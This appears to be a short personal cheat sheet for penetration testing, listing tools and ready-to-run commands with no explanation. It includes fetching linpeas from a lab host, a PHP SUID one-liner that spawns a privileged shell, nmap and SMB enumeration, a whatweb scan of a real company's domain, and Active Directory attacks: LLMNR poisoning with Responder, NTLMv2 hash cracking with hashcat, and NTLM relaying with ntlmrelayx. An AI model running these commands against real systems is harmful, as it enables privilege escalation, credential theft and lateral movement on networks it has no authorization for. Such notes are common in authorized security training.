Tools:
-winpeas
-linpeas
-ffuf
-ttyshell
-https://gtfobins.github.io





Commands:
-wget http://192.168.57.5/linpeas.sh linpeas.sh
-find / -type f -perm -4000 2>/dev/null
-/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
-nmap -T4 -p- -A 192.168.57.4
-smbclient -L \\\\192.168.57.4\\
-whatweb -a 3 --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" https://tesla.com


Active dir:


llmnr poisoning:
 sudo responder -I eth0 -dvPv

hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt    


map --script=smb2-security-mode.nse -p445 10.0.0.10 -Pn

sudo ntlmrelayx.py -tf targets.txt -smb2support

https://github.com/Dewalt-arch/pimpmykali